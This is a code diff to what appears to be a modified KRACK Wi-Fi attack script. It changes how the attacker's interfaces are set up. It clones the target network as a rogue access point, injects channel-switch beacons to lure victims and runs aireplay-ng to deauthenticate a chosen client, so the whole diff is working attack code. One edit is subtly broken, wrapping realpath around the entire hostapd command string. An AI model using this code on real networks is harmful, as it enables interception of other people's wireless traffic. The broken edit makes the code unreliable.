@@ -539,8 +539,10 @@ class KRAckAttack():
 		self.hostapd_log.write(datetime.now().strftime('[%H:%M:%S] ') + line.decode())
 
 	def configure_interfaces(self):
-		# 0. Warn about common mistakes, NOTICES capture effect.
+		# 0. Warn about common mistakes
 		log(STATUS, "Note: remember to disable Wi-Fi in your network manager so it doesn't interfere with this script")
+		# This happens when targetting a specific client: both interfaces will ACK frames from each other due to the capture
+		# effect, meaning certain frames will not reach the rogue AP or the client. As a result, the client will disconnect.
 		log(STATUS, "Note: keep >1 meter between both interfaces. Else packet delivery is unreliable & target may disconnect")
 
 		# 1. Configure monitor mode on interfaces
@@ -572,7 +574,6 @@ class KRAckAttack():
 		
 		self.sock_real  = MitmSocket(type=ETH_P_ALL, iface=self.nic_real_mon , dumpfile=self.dumpfile, strict_echo_test=strict_echo_test)
 		self.sock_rogue = MitmSocket(type=ETH_P_ALL, iface=self.nic_rogue_mon, dumpfile=self.dumpfile, strict_echo_test=strict_echo_test)
-
 		# 測試監聽模式是否有正常運行，並且取得 wifi ap 的 MAC addr.
 		self.find_beacon(self.ssid)
 		if self.beacon is None:
@@ -587,6 +588,8 @@ class KRAckAttack():
 		elif self.netconfig.real_channel > 13:
 			log(WARNING, "Attack not yet tested against 5 GHz networks.")
 		self.netconfig.find_rogue_channel()
+		self.sock_rogue.set_channel(self.netconfig.rogue_channel)
+		self.sock_real.set_channel(self.netconfig.real_channel)
 
 		log(STATUS, "Target network %s detected on channel %d" % (self.apmac, self.netconfig.real_channel), color="green")
 		log(STATUS, "Will create rogue AP on channel %d" % self.netconfig.rogue_channel, color="green")
@@ -594,19 +597,16 @@ class KRAckAttack():
 		log(STATUS, "Setting MAC address of %s to %s" % (self.nic_rogue_ap, self.apmac))
 		set_mac_address(self.nic_rogue_ap, self.apmac)
 
-		# Second check for set channel
-		self.sock_rogue.set_channel(self.netconfig.rogue_channel)
-		self.sock_real.set_channel(self.netconfig.real_channel)
-
 		# Put the client ACK interface up (at this point switching channels on nic_real may no longer be possible)
-		subprocess.check_output(["ifconfig", self.nic_real_clientack, "down"])
-		subprocess.check_output(["iw", self.nic_real_clientack, "set", "channel", str(self.netconfig.real_channel)])
-		subprocess.check_output(["ifconfig", self.nic_real_clientack, "up"])
+		if self.nic_real_clientack: 
+			subprocess.check_output(["ifconfig", self.nic_real_clientack, "down"])
+			subprocess.check_output(["iw", self.nic_real_clientack, "set", "channel", str(self.netconfig.real_channel)])
+			subprocess.check_output(["ifconfig", self.nic_real_clientack, "up"])
 
 		# Set up a rogue AP that clones the target network (don't use tempfile - it can be useful to manually use the generated config)
 		with open(os.path.realpath(os.path.join(self.script_path, "../hostapd/hostapd_rogue.conf")), "w") as fp:
 			fp.write(self.netconfig.write_config(self.nic_rogue_ap))
-		hostapd_path = os.path.realpath(os.path.join(self.script_path, "../hostapd/hostapd")) + ' ' + os.path.realpath(os.path.join(self.script_path, "../hostapd/hostapd_rogue.conf")) + " -dd" + " -K"
+		hostapd_path = os.path.realpath((os.path.join(self.script_path, "../hostapd/hostapd")) + ' ' + os.path.realpath(os.path.join(self.script_path, "../hostapd/hostapd_rogue.conf")) + " -dd" + " -K")
 		self.hostapd = subprocess.Popen(hostapd_path, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
 		self.hostapd_log = open("hostapd_rogue.log", "w")
 		
@@ -621,6 +621,7 @@ class KRAckAttack():
 
 		# Inject some CSA beacons to push victims to our channel
 		self.send_csa_beacon(numbeacons=4)
+		# subprocess.check_output(["iw", self.nic_real_clientack, "set", "channel", str(self.netconfig.real_channel)])
 
 		# deauthenticated 所有 client端，讓 AP 端重新四次交握
 		# for i in range(0, 11):
@@ -630,10 +631,10 @@ class KRAckAttack():
 		subprocess.call(["aireplay-ng", "-0", "10", "-a", self.apmac, "-c", self.clientmac, self.nic_real_mon])
 
 		# For good measure, also queue a dissasociation to the targeted client on the rogue channel
-		if self.clientmac:
-			self.queue_disas(self.clientmac)	
+		# if self.clientmac:
+		# 	self.queue_disas(self.clientmac)	
 		subprocess.check_output(["iw", self.nic_real_clientack, "set", "channel", str(self.netconfig.real_channel)])
-
+		
 		# Continue attack by monitoring both channels and performing needed actions
 		self.last_real_beacon = time.time()
 		self.last_rogue_beacon = time.time()
